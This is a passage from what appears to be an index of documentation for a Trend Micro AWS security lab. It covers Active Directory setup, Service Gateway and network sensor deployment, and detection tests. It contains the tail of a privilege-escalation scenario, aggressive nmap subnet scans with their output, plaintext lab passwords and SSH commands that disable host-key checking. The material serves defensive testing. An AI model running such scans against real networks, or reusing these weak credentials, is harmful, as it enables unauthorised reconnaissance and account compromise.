/bin/sh\n</code></pre> <li> <p>We haven't come across an error, and have spawned a new shell. Run the below-mentioned commands to check if we have escalated our privileges.</p> <pre><code>whoami\nid\n</code></pre> </li> <p>More to come</p>"},{"location":"scenarios/identity-security/identity-posture/populate-ad/","title":"Scenario: Populate the Active Directory","text":""},{"location":"scenarios/identity-security/identity-posture/populate-ad/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Active Directory</li> <li>Activated Marketplace AMI for Trend Service Gateway BYOL</li> </ul> <p>You need to have activated the Trend Service Gateway BYOL AMI in Marketplace once. To do this, on the AWS Console choose the service EC2 and navigate to <code>Images --&gt; AMI Catalog</code>. Select the tab <code>AWS Marketplace AMIs</code> and seach for <code>Trend Micro Service Gateway</code>.</p> <p></p> <p>There should only be one AMI shown for your current region. Click on <code>[Select]</code> and <code>[Subscribe on instance launch]</code>. </p> <p></p> <p>Now, check your Playground One configuration.</p> <p>Verify, that you have <code>AWS AD - create PGO Active Directory</code> and <code>AWS SG - create Service Gateway</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nAWS AD - create PGO Active Directory [true]: \nAWS MAD - create Managed Active Directory [false]:\nAWS SG - create Service Gateway [true]:\n...\n</code></pre> <pre><code># With SG and PGO AD enabled\npgo --apply network\n</code></pre> <p>The Service Gateway gets a dedicated AWS Security Group assigned which allows SSH from your configured access IP(s) only. All other ports are only accessible from within the public and private subnets.</p>"},{"location":"scenarios/identity-security/identity-posture/populate-ad/#review-the-active-directory","title":"Review the Active Directory","text":"<p>After applying the network the Active Directory will build itself automatically. It consists out of two machines both based on Windows Server 2022:</p> <ul> <li>Windows Domain Controller </li> <li>Windows Certification Authority</li> </ul> <p>After instantiation of the virtual machines the domain is created and the servers are rebooted as required in Windows \ud83d\ude1c.</p> <p>This process takes a couple of minutes.</p> <p>The output of <code>pgo --output network</code> lists some relevant info for this scenario:</p> <pre><code>...\nad_ca_ip = \"3.71.6.173\"\nad_dc_ip = \"18.196.75.194\"\nad_dc_pip = \"10.0.4.107\"\nad_domain_admin = \"Administrator\"\nad_domain_name = \"pgo-id.local\"\n...\nsg_va_ip = \"18.192.25.254\"\nsg_va_ssh = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-sd1ly786.pem -o StrictHostKeyChecking=no admin@18.192.25.254\"\n...\nad_admin_password = TrendMicro.1\n</code></pre> <ul> <li><code>ad_ca_ip</code>: Public IP address of your Certification Authority</li> <li><code>ad_dc_ip</code> and <code>ad_dc_pip</code>: Public and private IP address of your Domain Controller</li> <li><code>ad_domain_name</code>: Name of your Domain</li> <li><code>ad_domain_admin</code> and <code>ad_admin_password</code>: Name and password for the Domain Admin</li> <li><code>sg_va_ssh</code>: ssh command to connect to the Service Gateway</li> </ul> <p>Use your Remote Desktop app to connect to the Domain Controller.</p> <p></p>"},{"location":"scenarios/identity-security/identity-posture/populate-ad/#connect-the-service-gateway-to-vision-one","title":"Connect the Service Gateway to Vision One","text":""},{"location":"scenarios/identity-security/identity-posture/populate-ad/#get-the-vision-one-api-key","title":"Get the Vision One API Key","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> and click on <code>[Download Virtual Appliance]</code>.</p> <p></p> <p>In this scenario, you do not need to download the virtual appliance as we will be using an AWS Marketplace AMI. Simply copy the registration token shown at the bottom right and save it in a safe place.</p> <p></p>"},{"location":"scenarios/identity-security/identity-posture/populate-ad/#activate-the-service-gateway","title":"Activate the Service Gateway","text":"<p>Back to your console/shell run the following command (adapt the parameters to your environment):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nsg_va_ssh = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\"\n...\nmad_admin_password = XrJ*5VPDZGmhhL70\n</code></pre> <p>The interesting value here is <code>sg_va_ssh</code>. Run the given command to connect to the Service Gateway.</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\n</code></pre> <p></p> <pre><code>enable\n\nregister &lt;your API Token from the first step&gt;\n</code></pre> <p>It can take some time for the Service Gateway to show up in the console.</p>"},{"location":"scenarios/identity-security/identity-posture/populate-ad/#connect-the-pgo-active-directory","title":"Connect the PGO Active Directory","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> again. There should now be a Service Gateway listed. Select it, click on <code>Manage Services</code> just in the center, and download the <code>On-premise directory connection</code> to the gateway.</p> <p></p> <p></p> <p>In the Connection Settings choose the following parameters:</p> <ul> <li>Server Type: Microsoft Active Directory</li> <li>Server address: One of the private IPs out of <code>ad_dc_pip</code></li> <li>Encryption: <code>SSL</code></li> <li>Port: <code>636</code></li> <li>Base Distinguished Name: <code>Specific</code>, value: <code>DC=&lt;your environment name&gt;, DC=local</code></li> <li>Permission scope: <code>Read &amp; write</code></li> <li>User Name: <code>Administrator@&lt;your environment name&gt;.local</code></li> <li>Password: <code>ad_admin_password</code></li> </ul> <p>Example with environment name <code>pgo-id</code>:</p> <p></p> <p>This should connect the Active Directory to Vision One via the Service Gateway.</p> <p>Using the PGO Active Directory allows you to utilize the Security Event Forwarding. For this functionality you need to download the current installation package on the Domain Controller and walk through the installation procedure. If you want to use this functionality here, follow the instructions in the chapter here and return completing the chapter.</p>"},{"location":"scenarios/identity-security/identity-posture/populate-ad/#populate-the-active-directory","title":"Populate the Active Directory","text":"<p>Let's populate our Active Directory with users, groups, GPOs and some computers.</p> <p>Do this by running</p> <pre><code>pgo --apply scenarios-identity\n</code></pre> <p>Check back at your Domain Controller and look out for newly added entities.</p> <p>After the next synchronization with Vision One you will see some Identities and Assets listed in <code>Identity Security -&gt; Identity Posture</code>.</p>"},{"location":"scenarios/network-security/v1-deep-discovery-inspector/","title":"Scenario: Deploying Deep Discovery Inspector on AWS","text":"<p>NOT FINISHED YET</p>"},{"location":"scenarios/network-security/v1-deep-discovery-inspector/#traffic-mirror-on-aws","title":"Traffic Mirror on AWS","text":"<p>In an on-premises environment, you would connect the data port of a Deep Discovery Inspector to a single mirror port to capture all traffic on that switch.</p> <p>In AWS, you can achieve similar functionality to a switch mirror port by using Traffic Mirroring on Elastic Network Interfaces (ENIs). This feature allows you to capture and inspect network traffic by mirroring it to another interface running monitoring software, such as our Inspector. However, unlike physical switches, in AWS you must explicitly configure traffic mirroring for each ENI you want to monitor.</p>"},{"location":"scenarios/network-security/v1-deep-discovery-inspector/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network</li> <li>Activated Marketplace AMI for Trend Deep Discovery Inspector BYOL</li> <li>A valid license key for Deep Discovery Inspector</li> </ul> <p>You need to have activated the Trend Deep Discovery Inspector BYOL AMI in Marketplace once. To do this, on the AWS Console choose the service EC2 and navigate to <code>Images --&gt; AMI Catalog</code>. Select the tab <code>AWS Marketplace AMIs</code> and seach for <code>Trend Micro Virtual Network Sensor</code>.</p> <p>There should only be one AMI shown for your current region. Click on <code>[Select]</code> and <code>[Subscribe on instance launch]</code>. </p> <p>Now, check your Playground One configuration.</p> <p>Verify, that you have <code>DDI - create Deep Discovery Inspector</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nDDI - create Deep Discovery Inspector? [true]: \n...\n</code></pre> <p>Ensure to have the Playground One Network up and running:</p> <pre><code># Network configuration\npgo --apply network\n\n# Instances configuration\npgo --apply instances\n</code></pre> <p>You will get some output generated, the DDI relevant section is shown below:</p> <pre><code>...\nOutputs:\n...\nddi_ami = \"ami-0089a63d4c91694fc\"\nddi_va_ip = \"3.122.148.231\"\nddi_va_pip_dataport = \"10.0.4.45\"\nddi_va_pip_managementport = \"10.0.4.230\"\nddi_va_traffic_mirror_filter_id = \"tmf-0729a55b05120aedb\"\nddi_va_traffic_mirror_target_id = \"tmt-032ac48714893a91f\"\n...\n</code></pre> <p>Use <code>ddi_va_id</code> to connect from the Vision One console.</p> <p>Initial Authentication</p> <p>The first time you authenticate to the DDI console, you will be asked for an administrator account. Use <code>admin/admin</code> for this.</p>"},{"location":"scenarios/network-security/v1-deep-discovery-inspector/#test-it","title":"Test It","text":"<p>VERIFY</p> <p>Connect to the <code>linux_web</code> instance</p> <pre><code>pgo -o instances\n __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\nUsing PDO User Access Key ID: ...S7CH\nConfiguration instances in directory /home/markus/projects/opensource/playground/playground-one/awsone/3-instances\ninstance_ip_linux_db = \"18.194.28.64\"\ninstance_ip_linux_web = \"18.185.107.182\"\ninstance_username_linux_server = \"ubuntu\"\ns3_bucket = \"pgo-id-bucket-vkdhir40\"\nssh_instance_linux_db = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-51f2emm2.pem -o StrictHostKeyChecking=no ubuntu@18.194.28.64\"\nssh_instance_linux_web = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-51f2emm2.pem -o StrictHostKeyChecking=no ubuntu@18.185.107.182\"\n``\u00b4\n\n```sh\nssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-51f2emm2.pem -o StrictHostKeyChecking=no ubuntu@18.185.107.182\n</code></pre> <p>Now install <code>nmap</code> to trigger a simple detection with our Virtual Network Sensor.</p> <pre><code>sudo apt update\nsudo apt install -y nmap\n</code></pre> <p>Scan the subnet</p> <pre><code>nmap 10.0.4.0/24\n</code></pre> <pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-25 11:15 UTC\nNmap scan report for ip-10-0-4-13.eu-central-1.compute.internal (10.0.4.13)\nHost is up (0.000074s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap scan report for ip-10-0-4-57.eu-central-1.compute.internal (10.0.4.57)\nHost is up (0.00040s latency).\nNot shown: 986 filtered ports\nPORT     STATE  SERVICE\n20/tcp   closed ftp-data\n21/tcp   closed ftp\n22/tcp   open   ssh\n25/tcp   closed smtp\n53/tcp   closed domain\n80/tcp   closed http\n110/tcp  closed pop3\n113/tcp  closed ident\n143/tcp  closed imap\n443/tcp  closed https\n993/tcp  closed imaps\n1521/tcp closed oracle\n3306/tcp closed mysql\n5560/tcp closed isqlplus\n\nNmap done: 256 IP addresses (2 hosts up) scanned in 7.67 seconds\n</code></pre> <pre><code>nmap -T4 -A -v 10.0.4.0/24\n</code></pre> <pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-30 14:52 UTC\nNmap scan report for 10.0.4.91\nHost is up (0.00026s latency).\nNot shown: 986 filtered ports\nPORT     STATE  SERVICE  VERSION\n20/tcp   closed ftp-data\n21/tcp   closed ftp\n22/tcp   open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n25/tcp   closed smtp\n53/tcp   closed domain\n80/tcp   closed http\n110/tcp  closed pop3\n113/tcp  closed ident\n143/tcp  closed imap\n443/tcp  closed https\n993/tcp  closed imaps\n1521/tcp closed oracle\n3306/tcp closed mysql\n5560/tcp closed isqlplus\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap scan report for linuxweb (10.0.4.145)\nHost is up (0.000093s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Welcome to nginx!\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNmap scan report for 10.0.4.192\nHost is up (0.00081s latency).\nNot shown: 995 filtered ports\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: ADFS\n|   NetBIOS_Domain_Name: ADFS\n|   NetBIOS_Computer_Name: PGO-CA\n|   DNS_Domain_Name: pgo-id.local\n|   DNS_Computer_Name: PGO-CA.pgo-id.local\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-07-30T14:53:04+00:00\n| ssl-cert: Subject: commonName=PGO-CA.pgo-id.local\n| Not valid before: 2024-07-29T11:08:41\n|_Not valid after:  2025-01-28T11:08:41\n|_ssl-date: 2024-07-30T14:53:44+00:00; 0s from scanner time.\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: PGO-CA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:5b:ce:db:4e:69 (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2024-07-30T14:53:04\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 512 IP addresses (3 hosts up) scanned in 64.22 seconds\n</code></pre> <p>Head over to XDR Threat Investigation -&gt; Observed Attack Techniques.</p> <p>Set the Risk Level to include <code>Medium</code> and Datasource to <code>Network -&gt; Network Sensor</code>. The following detection should pop up:</p> <p></p>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/","title":"Scenario: Deploying Virtual Network Sensor on AWS Manually","text":"<p>NOT FINISHED YET</p> <p>Solve dependency with instances. Create Traffic Mirror Session in instances when VNS is enabled. </p>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#traffic-mirror-on-aws","title":"Traffic Mirror on AWS","text":"<p>In an on-premises environment, you would connect the data port of a Deep Discovery Inspector to a single mirror port to capture all traffic on that switch.</p> <p>In AWS, you can achieve similar functionality to a switch mirror port by using Traffic Mirroring on Elastic Network Interfaces (ENIs). This feature allows you to capture and inspect network traffic by mirroring it to another interface running monitoring software, such as our Inspector. However, unlike physical switches, in AWS you must explicitly configure traffic mirroring for each ENI you want to monitor.</p>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#prerequisites","title":"Prerequisites","text":"<ul> <li>AWS Cloud Account integrated with Vision One</li> </ul> <p>Ensure to have the Playground One Network and Linux Instances up and running:</p> <pre><code># Network configuration\npgo --apply network\n\n# Instances configuration\npgo --apply instances\n</code></pre>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#links","title":"Links","text":"<ul> <li>https://docs.trendmicro.com/en-us/documentation/article/trend-vision-one-virtual-network-sensor-aws</li> <li>https://docs.trendmicro.com/en-us/documentation/article/trend-vision-one-network-sensor-traffic-mirror</li> <li>https://docs.trendmicro.com/en-us/documentation/article/trend-vision-one-launching-ami-instance</li> <li>https://docs.trendmicro.com/en-us/documentation/article/trend-vision-one-aws-security-groups-network-sensor</li> </ul>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#ddi-vs-tp-vs-virtual-network-sensor","title":"DDI v.s. TP v.s Virtual Network Sensor","text":"<p>Link: https://trendmicro.atlassian.net/wiki/spaces/VO/pages/356499659/DDI+v.s.+TP+v.s+Virtual+Network+Sensor</p>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#security-group","title":"Security Group","text":""},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#data-port-security-group","title":"Data Port Security Group","text":"<p>Head over to <code>EC2 -&gt; Security Groups -&gt; Create Security Group</code></p> <p>Configure the Basic details.</p> <ol> <li><code>Name</code>: <code>VirtualNetworkSensor_DataPort</code></li> <li>Type a description of the ruleset.</li> <li>Select the Playground One VPC to save the security group.</li> </ol> <p>Configure the Inbound rules.</p> <ol> <li>Click Add rule.</li> <li>Configure the new rule.</li> <li>Type: Select All traffic.</li> <li>Source: Trend Micro recommends setting the source to custom and setting the IP to 0.0.0.0/0 to allow the Virtual Network Sensor to scan all traffic. Allowing all traffic to the data port provides the Virtual Network Sensor with maximum visibility into your security environment.</li> </ol> <p></p> <p>Make sure Outbound rules is set to the default to accept all traffic.</p> <p></p> <ol> <li>Assign tags to your rule.</li> <li>Click Create security group.</li> </ol>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#management-port-security-group","title":"Management Port Security Group","text":"<p>Again, click on <code>Create Security Group</code></p> <p>Configure the Basic details. 1.  <code>Name</code>: <code>VirtualNetworkSensor_ManagementPort</code> 2.  Type a description of the ruleset. 3.  Select the VPC to save the security group.</p> <p>Configure the Inbound rules.</p> <ol> <li>Click Add rule to create a new rule.</li> <li> <p>Configure the following rules.</p> Type Protocol Port Range Source Type Source Purpose SSH TCP 22 Recommended: Custom Specify an IP address in CIDR notation or select a security group which is allowed to access the Virtual Network Sensor. For accessing the Virtual Network Sensor CLISH consoleHere we're setting our Access IP which we configured in PGO HTTP TCP 80 Recommended: Custom Specify an IP address in CIDR notation or select a security group which is allowed to access the Virtual Network Sensor. Debug log exportHere we're setting our Access IP which we configured in PGO Custom UDP UDP 4789 Recommended: Custom Specify the IP address in CIDR notation of your mirror source or NLB. For VXLAN traffic required by the AWS traffic mirror Custom TCP TCP 14789 Recommended: Custom Specify the IP address in CIDR notation of your NLB. For answering NLB health check <p></p> </li> </ol> <p>Make sure Outbound rules is set to the default to accept all traffic.</p> <pre><code>![alt text](images/deploy-vns-sg-04.png \"SG\")\n</code></pre> <ol> <li>Assign tags to your rule.</li> <li>Click Create security group.</li> </ol> <p>Your environment should now be ready to launch the Virtual Network Sensor instance.</p>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#launching-a-virtual-network-sensor-ami-instance","title":"Launching a Virtual Network Sensor AMI instance","text":""},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#get-the-virtual-network-sensor-token-file","title":"Get the Virtual Network Sensor Token File","text":"<ol> <li>On the Trend Vision One console, go to <code>Network Security -&gt; Network Inventory -&gt; Virtual Network Sensor</code>.</li> <li> <p>Click Deploy Virtual Network Sensor. The Virtual Network Sensor Deployment panel appears.</p> <p></p> </li> <li> <p>Select Amazon Web Services for the platform.</p> </li> <li> <p>Set the Admin password and confirm the password.</p> <p></p> </li> <li> <p>Click Download Token to download the token file.</p> </li> </ol>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#create-the-virtual-network-sensor-instance","title":"Create the Virtual Network Sensor Instance","text":"<p>Head over to <code>EC2 -&gt; Instances</code></p> <p>Click Launch instance, then select Launch instance. The Launch an instance screen appears.</p> <ol> <li>In the Names and tags section, provide a name or add tags to the instance.</li> <li> <p>In the Application and OS Images (Amazon Machine Image) section, find and select the Virtual Network Sensor AMI.</p> <ol> <li>In the Application and OS Images (Amazon Machine Image) section, click Browse more AMIs.</li> <li>In the Choose an Amazon Machine Image (AMI) screen, select AWS Marketplace AMIs under the search bar.</li> <li>Search for Trend Vision One.</li> <li> <p>Find Trend Vision One\u2122 XDR for Networks (BYOL) and click Select.</p> <p>     5.  Review the details and click Continue.</p> <p> 3.  In the Instance Type section, select an instance that meets the specifications for your deployment. Here we use the smallest variant <code>t3.large</code>.</p> </li> </ol> <p> 4.  In the Key pair (login) section, select Proceed without a key pair.</p> <p> 5.  In the Network settings section, click Edit and configure the settings. 1.  Configure the network deployment settings.     1.  Select the VPC to use for the instance.     2.  Select a Subnet to use for the Virtual Network Sensor data port.     3.  Set the Auto-assign Public IP to Disable.         Important: Do not select No preference for the subnet. 2.  Under Firewall (security groups), select Select existing security group. 3.  Do not select any Common security groups. 4.  Expand the Advanced network configuration section.         Important: To comply with the AWS environment, the Virtual Network Sensor uses Port 1 (eth1) for the management port, and Port 0 (eth0) for the data port. For the following steps, Port 0 is Network interface 1, and Port 1 is Network interface 2. 5.  Configure Network interface 1 for the data port.</p> <pre><code>![alt text](images/deploy-vns-09.png \"VNS\")\n1.  Description: Provide a description for the interface. Adding a clear description such as `Virtual Network Sensor Data Port` makes it easier to locate when configuring your AWS network settings after deployment.\n2.  Subnet: The subnet you selected previously for the data port.\n3.  Security groups: Select the security group for the data port.\n4.  Primary IP: Specify an IP address available on the subnet, or leave blank to have AWS automatically assign the IP address.\n</code></pre> <ol> <li>Click Add network interface.</li> <li> <p>Configure Network interface 2 for the maintenance port.</p> <p> 1.  Description: Provide a description for the interface. Adding a clear description such as <code>Virtual Network Sensor Management Port</code> makes it easier to locate when configuring your AWS network settings after deployment. 2.  Subnet: Select the subnet for the maintenance port. 3.  Security groups: Select the security group for the maintenance port. 4.  Primary IP: Specify an IP address available on the subnet, or leave blank to have AWS automatically assign the IP address. 6.  Use the Configure storage settings to specify the size of the root volume for your instance. Set the root volume size according to your throughput. Here we use 50GB, the smallest.</p> </li> </ol> <p> 7.  Expand the Advanced details section. 8.  Locate User data - optional and click Choose file. 9.  Select the token file you downloaded from Network Inventory.</p> <p> 10. Review the settings in the Summary panel and click Launch instance Once you launch the instance, the Virtual Network Sensor begins installation. Installation may take a few minutes to complete. You can view the status of the instance in the EC2 console by going to Instances \u2192 Instances. The Virtual Network Appliance is ready to connect and configure when the Instance state is Running and the Status check shows 2/2 checks passed.</p> </li> </ol>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#configuring-the-virtual-network-sensor-as-a-traffic-mirror-target","title":"Configuring the Virtual Network Sensor as a traffic mirror target","text":"<ol> <li>Sign in to the AWS Management Console.</li> <li> <p>Find the Interface ID for the mirror source and the Virtual Network Sensor data port.     Note:     If you are deploying a Virtual Network Sensor behind a network load balancer, the network load balancer you created is the mirror source. You do not need to locate the Interface ID for the network load balancer.</p> <ol> <li>Access the EC2 dashboard.</li> <li>Go to Instances \u2192 Instances.</li> <li>Locate the instance you want to use as the mirror source and click the instance ID.</li> <li>Go to Networking.</li> <li>On the Network Interfaces list, copy the Interface ID for the network interface you want to use as the mirror source.</li> <li>Go to Instances \u2192 Instances.</li> <li>Locate the Virtual Network Sensor instance you created and click the Instance ID.</li> <li>Go to Networking.</li> <li> <p>On the Network Interfaces list, copy the Interface ID for the Virtual Network Sensor data port (eth0).</p> <p>Tip: If you provided a description when setting up the instance, you can use the description instead of the Interface ID to locate the network interface. 3. Access the VPC dashboard. 4. In the top navigation bar, select the Region the VPC your instance is deployed to is located. 5. Go to Traffic Mirroring \u2192 Mirror filters. 6. Click Create traffic mirror filter. 7. Configure the Filter settings.    1. Name tag: Specify a unique name for the filter.    2. Use a name that is descriptive and easy to find, such as VirtualNetworkSensor-TrafficMirrorFilter.    3. Description: Specify a description for the filter.    4. Use a description that clearly explains the purpose of the filter, such as Virtual Network Sensor Traffic Mirror Filter.    5. Network services: Select amazon-dns.</p> </li> </ol> <p> 8. In the Inbound rules section, click Add rule. 9. Configure the new rule.</p> <p>Trend Micro recommends using a permissible rule set as detailed below. Adding additional rules to limit traffic might interfere with the visibility of the Virtual Network Sensor into your environment.</p> <p>Inbound rules for Data Port traffic mirror filter</p> Option Setting Description Number 100 The rule priority. Lower rule numbers have priority and are applied first. Rule action accept What action to take for a rule match Protocol All protocols The protocol to apply the rule Source CIDR block 0.0.0.0/0 The source IP address range in CIDR format to apply the rule Destination CIDR block 0.0.0.0/0 The destination IP address range in CIDR format to apply the rule Description Mirror all inbound traffic. A description of what the rule does <p> 10. In the Outbound rules section, click Add rule. 11. Configure the new rule.</p> <p>Trend Micro recommends using a permissible rule set as detailed below. Adding additional rules to limit traffic might interfere with the visibility of the Virtual Network Sensor into your environment.</p> <p>Outbound rules for Data Port traffic mirror filter</p> Option Setting Description Number 100 The rule priority. Lower rule numbers have priority and are applied first. Rule action accept What action to take for a rule match Protocol All protocols The protocol to apply the rule Source CIDR block 0.0.0.0/0 The source IP address range in CIDR format to apply the rule Destination CIDR block 0.0.0.0/0 The destination IP address range in CIDR format to apply the rule Description Mirror all outbound traffic. A description of what the rule does <p> 12. Click Create. Creating the mirror filter takes a moment to complete. Once finished, click Close. 13. Go to Traffic Mirroring \u2192 Mirror targets. 14. Click Create traffic mirror target. 15. Configure Target settings. 1.  Name tag: Specify a unique name for the target settings. Use a name that is descriptive and easy to find, such as VirtualNetworkSensor-TrafficMirrorTarget. 2.  Description: Specify a description for the target. Use a description that clearly explains the purpose of the filter, such as Virtual Network Sensor Traffic Mirror Target.</p> <p> 16. Configure Choose target. 1.  For normal deployments, use the following configurations:     1.  For Target type, select Network Interface.     2.  For Target specify the data port Interface ID or search by the network interface description. 2.  For deploying behind a Network Load Balancer, use the following configurations:     1.  For Target type, select Network Load Balancer.     2.  For Target specify the network load balancer you created.</p> <p> 17. Click Create. Creating the mirror target takes a moment to complete. Once finished, click Close. 18. Go to Traffic Mirroring \u2192 Mirror session. 19. Click Create traffic mirror session. 20. Configure Session settings. 1.  Name tag: Specify a unique name for the mirror session. Use a name that is descriptive and easy to find, such as <code>VirtualNetworkSensor-TrafficMirrorSession</code>. 2.  Description: Specify a description for the mirror session. Use a description that clearly explains the purpose of the session, such as Virtual Network Sensor Traffic Mirror Session. 3.  Mirror source: Specify the mirror source Interface ID. 4.  Mirror target: Specify the name of the mirror target you created.</p> <p> 21. Configure Additional settings. For best results, Trend Micro recommends using the following settings. You can adjust these settings to best fit the needs of your security environment.</p> <p>Additional settings for traffic mirror session</p> Option Setting Description Session number 1 The session priorityThe session number determines the order traffic mirror sessions are evaluated in the following situations:When an interface is used by multiple sessionsWhen an interface is used by different traffic mirror targets and traffic mirror filtersTraffic is only mirrored one time, so use the recommended setting to ensure the highest priority. VNI Leave blank The unique VXLAN network identifierLeave blank to allow AWS to assign a random number.If you prefer to designate the VXLAN manually, see https://tools.ietf.org/html/rfc7348. Packet length Leave blank The number of bytes in each packet to mirrorLeave blank to allow mirroring of the entire packet.Specifying a number limits the packet length to the specified number of bytes. For example, setting to 100 only transfers the first 100 bytes of a packet after the VXLAN header. Filter Select the traffic mirror filter you created The traffic mirror filter to use for the mirror session <p> 22. Click Create. Creating the mirror session takes a moment to complete. Once finished, the Virtual Network Sensor starts monitoring the mirrored traffic.</p> </li> </ol>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#register","title":"Register","text":"<pre><code>markus@devng:~/projects/opensource/playground/playground-one$ ssh admin@3.121.165.189\n(admin@3.121.165.189) Password: \nTrend Vision One - Virtual Network Sensor\n\n* Version: 1.0.1316\n* Status: Disconnected\n* Trend Vision One console: -\n\nWelcome admin - 2024-07-25 09:50:29 UTC+00\n\n\n&gt; enable\n\n# connect\nTrend Vision One : unregistered\nNetwork Inventory: unregistered\nNetwork Analytics: unregistered\n\n# register\nRequest sent successfully to Trend Vision One. The registration process might take some time.\n</code></pre>"},{"location":"scenarios/network-security/v1-virtual-network-sensor-manually/#test-it","title":"Test It","text":"<p>Connect to the <code>linux_web</code> instance</p> <pre><code>pgo -o instances\n __                 __   __   __             __      __        ___ \n|__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  \n|    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ \n\nUsing PDO User Access Key ID: ...S7CH\nConfiguration instances in directory /home/markus/projects/opensource/playground/playground-one/awsone/3-instances\ninstance_ip_linux_db = \"18.194.28.64\"\ninstance_ip_linux_web = \"18.185.107.182\"\ninstance_username_linux_server = \"ubuntu\"\ns3_bucket = \"pgo-id-bucket-vkdhir40\"\nssh_instance_linux_db = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-51f2emm2.pem -o StrictHostKeyChecking=no ubuntu@18.194.28.64\"\nssh_instance_linux_web = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-51f2emm2.pem -o StrictHostKeyChecking=no ubuntu@18.185.107.182\"\n``\u00b4\n\n```sh\nssh -i /home/markus/projects/opensource/playground/playground-one/pgo-id-key-pair-51f2emm2.pem -o StrictHostKeyChecking=no ubuntu@18.185.107.182\n</code></pre> <p>Now install <code>nmap</code> to trigger a simple detection with our Virtual Network Sensor.</p> <pre><code>sudo apt update\nsudo apt install -y nmap\n</code></pre> <p>Scan the subnet</p> <pre><code>nmap 10.0.4.0/24\n</code></pre> <pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-25 11:15 UTC\nNmap scan report for ip-10-0-4-13.eu-central-1.compute.internal (10.0.4.13)\nHost is up (0.000074s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap scan report for ip-10-0-4-57.eu-central-1.compute.internal (10.0.4.57)\nHost is up (0.00040s latency).\nNot shown: 986 filtered ports\nPORT     STATE  SERVICE\n20/tcp   closed ftp-data\n21/tcp   closed ftp\n22/tcp   open   ssh\n25/tcp   closed smtp\n53/tcp   closed domain\n80/tcp   closed http\n110/tcp  closed pop3\n113/tcp  closed ident\n143/tcp  closed imap\n443/tcp  closed https\n993/tcp  closed imaps\n1521/tcp closed oracle\n3306/tcp closed mysql\n5560/tcp closed isqlplus\n\nNmap done: 256 IP addresses (2 hosts up) scanned in 7.67 seconds\n</code></pre> <pre><code>nmap -T4 -A -v 10.0.4.0/24\n</code></pre> <pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-30 14:52 UTC\nNmap scan report for 10.0.4.91\nHost is up (0.00026s latency).\nNot shown: 986 filtered ports\nPORT     STATE  SERVICE  VERSION\n20/tcp   closed ftp-data\n21/tcp   closed ftp\n22/tcp   open   ssh      